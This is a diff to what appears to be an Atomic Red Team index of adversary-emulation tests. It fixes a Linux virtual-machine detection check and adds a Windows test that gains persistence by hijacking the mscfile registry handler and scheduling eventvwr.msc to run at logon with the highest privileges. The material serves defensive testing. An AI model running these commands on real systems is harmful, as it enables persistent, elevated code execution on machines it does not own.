@@ -13538,7 +13538,7 @@ input_arguments.output_file.default: /tmp/T1082.txt
 T1082,System Information Discovery,Linux VM Check via Hardware,31dad7ad-2286-4c02-ae92-274418c85fec,"Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.
 ",linux,,,"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
 if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""Droplet\|HVM\|VirtualBox\|VMware""; fi
-if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi
+if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi
 if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi
 if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi
 if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi
@@ -18219,11 +18219,33 @@ schtasks /Create /TN ""#{task_name}"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHE
 ECHO Let's open the Computer Management console now...
 compmgmt.msc
 ",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f
-schtasks /Delete /TN ""#{task_name}"" /F",,,"input_arguments.task_name.description: Name of the newly-created scheduled task
+schtasks /Delete /TN ""#{task_name}"" /F
+",,,"input_arguments.task_name.description: Name of the newly-created scheduled task
 
 input_arguments.task_name.type: string
 
 input_arguments.task_name.default: CompMgmtBypass
+
+input_arguments.payload.description: Command you want the task to execute
+
+input_arguments.payload.type: string
+
+input_arguments.payload.default: calc.exe
+
+"
+T1053.005,Scheduled Task/Job: Scheduled Task,Scheduled Task Persistence via Eventviewer.msc,02124c37-767e-4b76-9383-c9fc366d9d4c,"Adds persistence by abusing `eventviewer.msc` via a scheduled task.
+When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). 
+",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\#{payload}"" /f
+schtasks /Create /TN ""#{task_name}"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F
+ECHO Let's run the schedule task ...
+schtasks /Run /TN ""EventViewerBypass""
+",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f
+schtasks /Delete /TN ""#{task_name}"" /F
+",,,"input_arguments.task_name.description: Name of the newly-created scheduled task
+
+input_arguments.task_name.type: string
+
+input_arguments.task_name.default: EventViewerBypass
 
 input_arguments.payload.description: Command you want the task to execute
 
